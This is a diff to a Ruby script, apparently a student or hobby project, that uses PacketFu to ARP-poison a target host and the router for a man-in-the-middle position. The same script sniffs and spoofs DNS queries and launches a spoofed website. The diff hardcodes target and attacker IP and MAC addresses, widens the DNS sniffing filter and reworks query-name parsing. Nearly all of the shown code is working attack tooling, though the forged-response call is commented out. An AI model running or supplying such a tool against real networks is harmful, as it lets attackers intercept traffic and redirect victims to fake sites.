@@ -8,16 +8,19 @@ require 'thread'
 
 
 ## User defined variables
-@target_ip   = "192.168.1.101"  # IP of the host you would like to target
-@sender_ip   = "192.168.1.100"  # Your IP, or the attacking IP (MITM)
-@router_ip   = "192.168.1.1"    # IP of the router on the network to ARP Poison
+@target_ip   = "192.168.1.66"  # IP of the host you would like to target
+@target_mac  = "bc:f5:ac:e2:c6:28"
+@sender_ip   = "192.168.1.79"  # Your IP, or the attacking IP (MITM)
+@sender_mac  = "7c:7a:91:7d:2b:02"
+@router_ip   = "192.168.1.254"    # IP of the router on the network to ARP Poison
+@router_mac  = "ec:43:f6:49:a3:96"
 @iface       = "wlp2s0"         # Name of the primary network interface 
 
 ## DO NOT EDIT BELOW THIS LINE
 # Functions
 def runspoof(arp_packet_target,arp_packet_router)
   # Send out both packets
-  puts "Spoofing...."
+  puts "ARP Posioning Thread Started"
   caught=false
   while caught==false do
     sleep 1
@@ -31,9 +34,12 @@ def get_machine_addr(ip)
 end
 
 def spoof_dns(t_ip)
+  puts "DNS Spoofing Thread Started"
   #look for dns packets from target
-  filter = "udp and port 53 and src " + t_ip
+  #filter = "udp and port 53 and src " + t_ip
+  filter = "udp and port 53"
 
+  begin
   cap = PacketFu::Capture.new(:iface => @iface,
     :start => true,
     :promisc => true,
@@ -41,25 +47,89 @@ def spoof_dns(t_ip)
   cap.stream.each do |p|
     pkt = PacketFu::Packet.parse(p)
     if pkt.is_udp?
-      dns_hdr_flag = pkt.payload[2].to_s + pkt.payload[3].to_s
+      #dns_hdr_flag = pkt.payload[2].to_s + pkt.payload[3].to_s
+      #puts dns_hdr_flag.unpack('h*')
+      dns_hdr_flag = pkt.payload[2].unpack('h*')[0].chr+pkt.payload[3].unpack('h*')[0].chr
 
       #check if query
       if dns_hdr_flag == '10'
-        #extract domain name
-        domain_name = extract_domain(pkt.payload[3.to_s])
-        puts "Domain name is: #{name}"
+        puts pkt.payload
+        domain_name = extract_domain(pkt.payload[12..-1])
+
+        puts "Domain name is: #{domain_name}"
 
         #build and send response
-        send_dns_response(pkt, domain_name)
+        #send_dns_response(pkt, domain_name)
       end
     end
+  end
+  rescue Exception => ex
+    puts "something bad happening in dns"
+    puts ex.message
+    puts ex.backtrace
   end
 end
 
 def extract_domain(q_name)
   #take q name and extract all subdomains
+  domain_name = ""
+=begin
+  puts "length: #{q_name.length}"
+  puts q_name[0].unpack('U*')
+  puts q_name[1]
+  puts q_name[2]
+  puts q_name[3]
+  puts q_name[4].unpack('U*')
+  puts q_name[5]
+  puts q_name[6]
+  puts q_name[7]
+  puts q_name[8]
+  puts q_name[9]
+  puts q_name[10]
+  puts q_name[11]
+  puts q_name[12]
+  puts q_name[13]
+  puts q_name[14]
+  puts q_name[15]
+  puts q_name[16]
+  puts q_name[17]
+  puts q_name[18]
+  puts q_name[19]
+  puts q_name[20]
+  puts q_name[21]
+  puts q_name[22]
+  puts q_name[23]
+  puts q_name[24]
+  puts q_name[25]
+  puts q_name[26].unpack('U*')
+  puts q_name[27]
+  puts q_name[28]
+  puts q_name[29]
+  puts q_name[30].unpack('U*')
+  puts q_name[31]
+  puts q_name[32]
+=end
+
+  domain_name = ""
+  n = 0
+  loop {
+    puts "#{q_name[n].unpack('U*')} + #{q_name[n].class}"
+    if q_name[n].unpack('H*') == ["00"]
+      return domain_name
+    elsif q_name[n].is_a? Integer
+      puts "int"
+      domain_name += '.'
+      n += 1
+    else
+      domain_name += q_name[n]
+      n += 1
+    end 
+  }
+=begin
+  puts "starting extract domain name: #{q_name}" 
   name = ""
   loop {
+    puts "qname: #{q_name[0].unpack('n')}"
     len = q_name[0].to_i
     if len == 0
       name = name[0, name.length - 1]
@@ -72,6 +142,7 @@ def extract_domain(q_name)
       return nil
     end
   }
+=end
 end
 
 def send_dns_response(orig_pkt, name)
@@ -116,15 +187,12 @@ def send_dns_response(orig_pkt, name)
 end
 
 ## Main
-=begin
-@target_mac  = "b8:ac:6f:34:ad:d8"
-@sender_mac  = "7c:7a:91:7d:2b:02"
-@router_mac  = "00:22:6b:7c:9b:12"
-=end
 
+=begin doesnt seem to be working consistently enough
 @target_mac = get_machine_addr(@target_ip)
 @sender_mac = get_machine_addr(@sender_ip)
-@router_ip  = get_machine_addr(@router_ip)
+@router_mac  = get_machine_addr(@router_ip)
+=end
 
 # Construct the target's packet
 arp_packet_target = PacketFu::ARPPacket.new()
@@ -153,7 +221,7 @@ begin
   puts "Starting the ARP poisoning thread..."
   spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)} 
   puts "Starting the DNS spoofing thread..."
-  dns_thread = Thread.new{spoof_dns(target_ip)}
+  dns_thread = Thread.new{spoof_dns(@target_ip)}
   puts "Starting the spoofed website thread..."
   web_thread = Thread.new{`ruby site.rb`} #probably a better way to run this in the code, but good enough
   spoof_thread.join
